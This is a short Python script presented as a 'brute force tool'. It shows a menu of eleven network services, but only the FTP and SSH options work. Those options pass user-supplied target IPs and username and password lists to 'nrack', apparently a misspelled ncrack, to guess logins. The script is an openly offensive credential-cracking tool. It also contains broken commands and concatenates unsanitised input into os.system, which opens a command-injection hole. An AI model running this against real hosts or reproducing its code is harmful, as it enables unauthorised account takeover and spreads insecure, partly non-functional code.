#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("FIGLET BRUTE FORCE")
print("""
WELCOME THE BRUTE FORCE TOOL
1)FTP
2)SSH
3)TELNET
4)HTTP
5)SMB
6)ROP
7)SIP
8)REDIS
9)VNC
10)POSTGRESQL
11)MYSQL

""")
process_no=input("Enter The Process Number: ")
target_ip=input("Enter The Target IP: ")
username=input("File path with usernames: ")
password=input("File path with passwords: ")

if(process_no=="1"):
	os.system("nrack -p 21 -u " + username + " -P " + password + " " + target_ip)
elif(process_no=="2"):	
	os.system("nrack -p 22 -u " + username + " -P " + password + " " + target_ip)
